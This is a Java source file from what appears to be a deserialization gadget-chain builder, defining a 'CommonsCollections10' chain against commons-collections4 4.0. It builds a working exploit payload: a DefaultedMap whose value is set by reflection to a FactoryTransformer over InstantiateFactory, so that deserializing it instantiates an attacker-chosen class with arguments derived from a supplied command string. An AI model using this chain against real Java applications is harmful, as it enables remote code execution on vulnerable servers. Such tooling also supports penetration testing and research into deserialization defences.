package org.ses.gadgetbuilder.chains1;

import org.apache.commons.collections4.bag.TreeBag;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.FactoryTransformer;
import org.apache.commons.collections4.functors.InstantiateFactory;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.map.DefaultedMap;
import org.ses.gadgetbuilder.adapters.InitializeAdapter;
import org.ses.gadgetbuilder.adapters.MethodInvokeAdapter;
import org.ses.gadgetbuilder.annotations.Authors;
import org.ses.gadgetbuilder.annotations.Dependencies;
import org.ses.gadgetbuilder.annotations.Impact;
import org.ses.gadgetbuilder.chains.main.InstantiateGadgetChain;
import org.ses.gadgetbuilder.chains.main.MethodInvokeGadgetChain;
import org.ses.gadgetbuilder.chains.main.TrampolineConnector;
import org.ses.gadgetbuilder.chains.trampolines.singleparam.MapGetTrampoline;
import org.ses.gadgetbuilder.util.Reflections;

@Dependencies({"org.apache.commons:commons-collections4:4.0"})
@Authors({ Authors.YihengZhang })
@Impact(Impact.Instantiate)
public class CommonsCollections10 extends InstantiateGadgetChain<MapGetTrampoline, InitializeAdapter> {

    public CommonsCollections10(MapGetTrampoline _trampoline, InitializeAdapter _adapter) {
        super(_trampoline, _adapter);
    }

    @Override
    protected TrampolineConnector createPayload(String command) throws Exception {

        InstantiateFactory factory = new InstantiateFactory<>(
                initializeAdapter.getConstructorClass(),
                initializeAdapter.getParamTypes(),
                initializeAdapter.getParams(command));
        FactoryTransformer transformer = new FactoryTransformer<>(factory);

        DefaultedMap d = new DefaultedMap<>("1");
        Reflections.setFieldValue(d, "value", transformer);

        return new TrampolineConnector(d);
    }

    @Override
    protected void postProcessPayload() throws Exception {

    }

    @Override
    protected String getStackTrace() {
        return "org.apache.commons.collections4.map.DefaultedMap.get\n" +
                "org.apache.commons.collections4.functors.FactoryTransformer.transform\n" +
                "org.apache.commons.collections4.functors.InstantiateFactory.create\n" +
                "java.lang.reflect.Constructor.newInstance";
    }
}
